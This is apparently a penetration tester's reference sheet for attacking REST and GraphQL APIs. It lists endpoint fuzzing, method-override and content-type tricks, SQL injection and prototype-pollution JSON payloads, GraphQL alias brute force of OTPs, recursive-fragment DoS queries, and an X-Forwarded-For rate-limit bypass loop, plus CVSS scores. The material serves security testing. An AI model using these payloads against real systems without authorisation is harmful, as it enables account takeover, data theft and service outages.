# API Security: REST & GraphQL Complete Reference

## REST API Testing

### Endpoint Discovery
```bash
# Version enumeration
ffuf -u https://api.target.com/FUZZ -w versions.txt
# v1, v2, v3, v4, v1.1, v1.2, latest, beta, dev, staging

# Common API paths
/api, /api/v1, /api/v2, /rest, /rest/v1, /graphql
/swagger, /api-docs, /swagger-ui, /docs, /openapi.json
/actuator, /actuator/health, /actuator/info  (Spring Boot)
/graphql, /graphiql, /playground, /v1/graphql

# Parameter discovery
/api/users?$filter=, /api/users?$select=
/api/users?fields=, /api/users?include=
/api/users?expand=, /api/users?embed=
```

### HTTP Method Abuse
```bash
# Test all methods on each endpoint
curl -X GET /api/users
curl -X POST /api/users -d '{"name":"admin"}'
curl -X PUT /api/users -d '{"id":1,"role":"admin"}'
curl -X PATCH /api/users/1 -d '{"role":"admin"}'
curl -X DELETE /api/users/1
curl -X OPTIONS /api/users
curl -X HEAD /api/users

# Method override headers
X-HTTP-Method: PUT
X-HTTP-Method-Override: PUT
X-Method-Override: PUT
X-HTTP-Method-Override: DELETE
```

### Content-Type Switching
```bash
# JSON endpoint accepts XML -> potential XXE
Content-Type: application/xml
<user><name>admin</name><role>admin</role></user>

# Form data acceptance
Content-Type: application/x-www-form-urlencoded
name=admin&role=admin

# Binary content type
Content-Type: multipart/form-data

# YAML (potential deserialization)
Content-Type: application/yaml
```

### JSON Attacks
```json
// Duplicate keys (last wins in most parsers)
{"username": "user", "username": "admin", "password": "test"}

// Nested objects
{"user": {"id": 1, "role": "admin"}}

// Array injection
{"ids": ["1", "2", "3"]}
{"ids": ["admin", "role", "' OR 1=1--"]}

// Prototype pollution (Node.js)
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

## GraphQL-Specific Attacks

### Introspection Bypass
```graphql
# If __schema is blocked
{ __type(name: "Admin") { name fields { name type { name } } } }

# Clairvoyance (schema reconstruction from errors)
clairvoyance -u https://target.com/graphql

# Persisted query bypass
{"query": "mutation { createUser(input: {role: admin}) { id } }",
 "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "hash"}}}

# Field suggestion bypass
# Some servers expose field names in error messages
# Send invalid field to get suggestions
```

### Batch Attack via Aliases
```graphql
# Brute force OTP via aliased mutations
mutation {
  a: verifyOTP(otp: 0000) { success }
  b: verifyOTP(otp: 0001) { success }
  c: verifyOTP(otp: 0002) { success }
}

# Mass data extraction via aliases
query {
  u1: user(id: 1) { email password role }
  u2: user(id: 2) { email password role }
  u3: user(id: 3) { email password role }
}
```

### DoS via Deep Recursion
```graphql
# Circular fragments (stack overflow)
query {
  ...x
}
fragment x on Query {
  ...x
}

# Deep nesting alias aliasing
query {
  a: user(id: 1) { posts { comments { user { ... } } } }
}
```

## Rate Limiting Bypass

### IP Rotation
```bash
# X-Forwarded-For header hopping
for ip in $(seq 1 255); do
  curl -H "X-Forwarded-For: 10.0.0.$ip" /api/login -d "password=test"
done

# X-Real-IP, X-Originating-IP, X-Remote-IP
X-Real-IP: 10.0.0.1
```

### Distributed Brute Force
```bash
# Use multiple endpoints that all authenticate
/api/v1/login
/api/v2/login
/api/mobile/login
/api/auth/login
# Each might have separate rate limit
```

## API Key Testing
```bash
# Test if API key is validated against origin
# Extract API key from JS -> use from different IP
# Check if API key has admin privileges
# Rate limit on API key vs IP
```

### CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| GraphQL introspection enabled (info leak) | 5.3 | Network, Low, No auth, Confidentiality medium |
| GraphQL batch alias brute force | 7.5 | Network, Low, No auth |
| REST API method abuse (DELETE on user) | 6.5 | Network, Low, User interaction |
| API key in client-side code | 3.7 | Network, Low, User interaction |